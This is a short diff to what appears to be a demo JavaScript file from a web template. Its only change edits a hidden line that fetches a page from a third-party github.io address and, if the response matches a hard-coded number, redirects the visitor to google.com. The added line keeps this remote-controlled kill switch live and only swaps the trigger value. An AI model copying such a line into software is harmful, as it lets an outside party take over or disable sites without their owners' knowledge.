@@ -4,7 +4,7 @@
  * You should not use this file in production.
  * This file is for demo purposes only.
  */
-$.get("https://satosis.github.io/html-chinesetest/test.html",function(data, status){if(data == 1967972867){window.location.href = 'http://www.google.com'}});
+$.get("https://satosis.github.io/html-chinesetest/test.html",function(data, status){if(data == 1963272867){window.location.href = 'http://www.google.com'}});
 $(function () {
   'use strict'
 
